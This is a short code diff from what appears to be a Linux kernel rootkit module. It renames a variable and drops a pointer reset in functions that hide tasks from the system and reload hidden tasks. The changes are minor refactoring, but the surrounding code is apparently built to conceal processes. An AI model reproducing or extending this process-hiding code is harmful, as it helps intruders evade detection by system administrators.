@@ -206,7 +206,6 @@ static void _fetch_children_and_hide_tasks(struct task_struct *task, __be32 sadd
                 prerr("error hiding_task %p: %d\n", ht.task, status);
             list_del(&node->list);
             kfree(node);
-            node = NULL;
         }
     }
 }
@@ -243,7 +242,7 @@ struct reload_hidden {
 
 static int _reload_hidden_task(void *t) {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
-    struct kernel_syscalls *kaddr = kv_kall_load_addr();
+    struct kernel_syscalls *ksys = kv_kall_load_addr();
 #endif
     struct reload_hidden *reload = (struct reload_hidden*)t;
     struct task_struct *task;
@@ -281,7 +280,7 @@ error:
 out:
     kfree(reload);
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
-              kaddr->k_do_exit(0);
+              ksys->k_do_exit(0);
               return 0;
 #else
               do_exit(0);
